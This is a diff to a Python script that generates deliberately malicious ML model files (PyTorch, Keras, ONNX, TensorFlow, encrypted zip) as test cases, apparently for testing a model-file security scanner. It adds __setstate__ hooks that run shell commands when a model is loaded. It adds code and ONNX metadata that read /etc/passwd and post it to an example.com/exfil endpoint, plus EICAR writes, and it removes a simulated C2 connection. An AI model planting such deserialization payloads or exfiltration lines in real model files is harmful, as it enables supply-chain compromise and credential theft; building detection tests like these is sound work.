@@ -26,10 +26,24 @@ class MaliciousModelForTestCase4(nn.Module):
     def __init__(self):
         super(MaliciousModelForTestCase4, self).__init__()
         self.linear = nn.Linear(10, 1)
+    def forward(self, x):
+        return self.linear(x)
     def __setstate__(self, state):
         super(MaliciousModelForTestCase4, self).__setstate__(state)
         os.system('echo "Malicious code executed! (PyTorch .pt)" > /tmp/malicious.txt')
         eicar_payload()
+
+# Define MaliciousModel for Test Case 10
+class MaliciousModelForTestCase10(nn.Module):
+    def __init__(self):
+        super(MaliciousModelForTestCase10, self).__init__()
+        self.linear = nn.Linear(1, 1)
+    def forward(self, x):
+        return self.linear(x)
+    def __setstate__(self, state):
+        super(MaliciousModelForTestCase10, self).__setstate__(state)
+        with open('/tmp/eicar.com', 'w') as f:
+            f.write('X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*')
 
 # Payload functions
 def eicar_payload():
@@ -72,31 +86,33 @@ with open('/tmp/eicar.com', 'w') as f:
 """)
     os.chmod(os.path.join(assets_dir, 'malicious_tf_pb.py'), 0o755)
     print("Test case 1 generated: malicious_model_tf_pb")
+    print("Note: Malicious code is in assets/malicious_tf_pb.py, not directly in .pb due to TensorFlow SavedModel limitations.")
 
 # Test Case 2: Obfuscated Code in .h5 (Keras) + C2 Connection
+class MaliciousActivation:
+    def __call__(self, x):
+        return x
+    def __getstate__(self):
+        return {}
+    def __setstate__(self, state):
+        import os
+        os.system('echo "Malicious code executed! (Keras .h5)" > /tmp/malicious.txt')
+        c2_payload()
+    def get_config(self):
+        return {}
+    @staticmethod
+    def from_config(config):
+        return MaliciousActivation()
+
 def generate_test_case_2():
     inputs = tf.keras.Input(shape=(10,))
-    x = layers.Dense(10)(inputs)
+    activation = MaliciousActivation()
+    x = layers.Dense(10, activation=activation)(inputs)
     outputs = layers.Dense(1)(x)
     model = Model(inputs, outputs)
     model.save("./malicious_model_keras.h5")
-    assets_dir = './malicious_model_keras_assets'
-    os.makedirs(assets_dir, exist_ok=True)
-    with open(os.path.join(assets_dir, 'malicious_keras_h5.py'), 'w') as f:
-        f.write("""
-#!/usr/bin/env python
-import os
-os.system('echo "Malicious code executed! (Keras .h5)" > /tmp/malicious.txt')
-try:
-    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    s.connect(('192.168.1.100', 4444))
-    s.sendall(b'Connected')
-    s.close()
-except Exception as e:
-    print(f"[+] Simulated C2 connection (actual failed: {e})")
-""")
-    os.chmod(os.path.join(assets_dir, 'malicious_keras_h5.py'), 0o755)
     print("Test case 2 generated: malicious_model_keras.h5")
+    print("Note: Load with custom_objects={'MaliciousActivation': MaliciousActivation} to trigger payload.")
 
 # Test Case 3: Trojanized SavedModel Directory (TensorFlow) + Data Exfiltration
 def generate_test_case_3():
@@ -112,10 +128,17 @@ def generate_test_case_3():
 #!/usr/bin/env python
 import os
 os.system('echo "Malicious code executed! (Trojanized SavedModel)" > /tmp/malicious.txt')
-print("[+] Attempting data exfiltration (simulated)...")
+try:
+    with open('/etc/passwd', 'r') as f:
+        data = f.read()
+    import requests
+    requests.post('http://example.com/exfil', data={'data': data})
+except Exception as e:
+    print(f"[+] Simulated data exfiltration (actual failed: {e})")
 """)
     os.chmod(os.path.join(assets_dir, 'malicious.py'), 0o755)
     print("Test case 3 generated: malicious_saved_model_trojanized")
+    print("Note: Malicious code is in assets/malicious.py, not directly in model due to TensorFlow SavedModel limitations.")
 
 # Test Case 4: Code Injection in .pt / .pth Checkpoints (PyTorch) + EICAR
 def generate_test_case_4():
@@ -145,6 +168,7 @@ def generate_test_case_6():
     model.metadata_props.add(key="data_exfil", value="python -c \"import requests; with open('/etc/passwd', 'r') as f: data = f.read(); requests.post('http://example.com/exfil', data={'data': data})\"")
     onnx.save(model, 'malicious_onnx_model_metadata.onnx')
     print("Test case 6 generated: malicious_onnx_model_metadata.onnx")
+    print("Note: Metadata contains payload, requires parsing to execute.")
 
 # Test Case 7: Large Encoded Blobs in Node Attributes (ONNX) + EICAR
 def generate_test_case_7():
@@ -163,6 +187,7 @@ def generate_test_case_7():
     model.metadata_props.add(key="malicious_attr", value=encoded_malicious_code)
     onnx.save(model, 'malicious_onnx_model_node_attributes.onnx')
     print("Test case 7 generated: malicious_onnx_model_node_attributes.onnx")
+    print("Note: Metadata contains encoded payload, requires parsing to execute.")
 
 # Test Case 8: Malicious Code in scikit-learn .joblib or .pkl + C2 Connection
 def generate_test_case_8():
@@ -193,20 +218,16 @@ def generate_test_case_9():
     malicious_model.metadata_props.add(key="data_exfil", value="python -c \"import requests; with open('/etc/passwd', 'r') as f: data = f.read(); requests.post('http://example.com/exfil', data={'data': data})\"")
     onnx.save(malicious_model, 'forged_malicious_onnx_model.onnx')
     print("Test case 9 generated: forged_malicious_onnx_model.onnx")
+    print("Note: Metadata contains payload, requires parsing to execute.")
 
 # Test Case 10: Encrypted / Password-Protected Model Files (Other AI Model Formats) + EICAR
 def generate_test_case_10():
-    model = SimpleModel()
-    torch.save(model, 'model.pt')
+    model = MaliciousModelForTestCase10()
+    torch.save(model, 'malicious_model.pt')
     password = 'secret'
     with zipfile.ZipFile('encrypted_model.zip', 'w') as zip_file:
         zip_file.setpassword(password.encode())
-        zip_file.write('model.pt', arcname='model.pt')
-        zip_file.writestr('eicar.py', """
-#!/usr/bin/env python
-with open('/tmp/eicar.com', 'w') as f:
-    f.write('X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*')
-""")
+        zip_file.write('malicious_model.pt', arcname='model.pt')
     print("Test case 10 generated: encrypted_model.zip")
 
 # Main function to handle user input and generate test cases
